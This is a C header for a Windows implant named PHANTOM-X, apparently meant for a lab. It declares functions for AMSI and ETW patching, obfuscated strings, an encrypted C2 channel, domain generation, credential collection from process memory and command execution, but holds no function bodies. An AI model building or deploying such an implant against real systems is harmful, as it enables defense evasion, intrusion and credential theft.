/* ================================================================== */
/* PHANTOM-X :: shared declarations for the capability variants        */
/* ================================================================== */
/*                                                                        */
/* The variants live in separate translation units so that the baseline */
/* build genuinely does not contain them: a capability that is not      */
/* compiled in cannot be detected, and a lab that claims a capability   */
/* is "present but disabled" is not the same as one where the code is   */
/* not there at all.                                                    */
/*                                                                        */
/* Every entry point has a no-op definition in its own file when the   */
/* variant is disabled, so the payload links identically either way.    */
/* ================================================================== */

#ifndef PX_VARIANT_H
#define PX_VARIANT_H

#include <windows.h>
#include <stddef.h>

/* --- string obfuscation ---------------------------------------------- */
/* Decode an encoded string into `out`. Returns the length written. */
unsigned int px_obf_decode(unsigned int index, char *out, unsigned int cap);

/* --- AMSI ------------------------------------------------------------ */
/* Patch AmsiScanBuffer so it reports clean without scanning.
 * Returns 1 on success. */
int px_amsi_bypass(void);

/* --- ETW ------------------------------------------------------------- */
/* Patch EtwEventWrite so it returns without tracing.
 * Returns 1 on success. */
int px_etw_unhook(void);

/* --- encrypted channel ----------------------------------------------- */
/* Read the shared key. Called before the handshake. */
void px_ks_readkey(void);
/* Build the keystreams. Called AFTER the handshake, because the
 * handshake itself travels in the clear. */
void px_ks_setup(void);
int px_ks_active(void);
unsigned int px_ks_encrypt(const char *plain, unsigned int plainlen,
                           unsigned char *out, unsigned int outcap);
unsigned int px_ks_decrypt(const unsigned char *frame, unsigned int framelen,
                           char *out, unsigned int outcap);

/* --- domain generation ----------------------------------------------- */
unsigned int px_dga_host(char *out, unsigned int cap);
int px_dga_port(int fallback);

/* --- credential access ----------------------------------------------- */
/* Collect credential material from the lab VM.
 *
 * Writes a REDACTED summary to `report`: counts and a masked sample.
 * The secret material itself never goes on the wire. */
int px_cred_collect(char *report, unsigned int cap);

/* The size of the memory window read from the target process. */
#define PX_CRED_READ_WINDOW (256 * 1024)

/* --- resilient endpoints --------------------------------------------- */
/* The resolver types.
 *
 * These live here rather than in px_payload.c because the endpoint code
 * needs them and the endpoint code is a separate translation unit.
 *
 * PX_WSAAPI is the Winsock calling convention. It is defined here so
 * that the header is self-contained. */
#ifndef PX_WSAAPI
#define PX_WSAAPI __stdcall
#endif

typedef struct px_hostent {
    char *h_name;
    char **h_aliases;
    short h_addrtype;
    short h_length;
    char **h_addr_list;
} px_hostent;

typedef px_hostent *(PX_WSAAPI *fn_gethostbyname)(const char *);
typedef unsigned long (PX_WSAAPI *fn_inet_addr)(const char *);

/* One resolved address. */
typedef struct px_resolved {
    unsigned long addr;   /* network byte order */
    unsigned int port;
} px_resolved;

/* The set of addresses the payload will try, in order. */
typedef struct px_endpoint_set {
    px_resolved addrs[48];
    unsigned int count;
} px_endpoint_set;

/* Resolve every candidate endpoint into the address list. */
unsigned int px_endpoints_resolve(px_endpoint_set *set,
                                  const char *default_host,
                                  unsigned int default_port,
                                  fn_gethostbyname p_gethostbyname,
                                  fn_inet_addr p_inet_addr);

/* How long to wait before attempt number `attempt` (zero-based). */
unsigned int px_backoff_for(unsigned int attempt);

/* --- small helpers shared by the variants --------------------------- */
/* A bounded snprintf that always terminates. Returns the length that
 * WOULD have been written, so the caller can detect truncation. */
unsigned int px_snprintf(char *out, unsigned int cap, const char *fmt, ...);

/* A case-insensitive compare. The payload has no CRT, so strcmp and
 * friends are not available. */
int px_stricmp(const char *a, const char *b);

/* Run a command and capture its output.
 *
 * The returned buffer is heap-allocated and the caller frees it. */
char *px_run_capture(const char *cmd, char *out, unsigned int cap, long *rc);

#endif /* PX_VARIANT_H */
